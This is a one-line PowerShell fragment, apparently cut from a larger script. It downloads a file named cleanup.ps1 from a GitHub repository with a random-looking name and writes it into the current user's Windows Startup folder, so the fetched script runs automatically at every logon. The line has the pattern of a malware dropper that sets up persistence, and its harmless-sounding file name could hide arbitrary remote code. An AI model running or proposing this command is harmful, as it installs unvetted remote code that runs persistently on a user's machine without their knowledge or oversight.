...
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup.ps1' -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Startup\cleanup.ps1" 
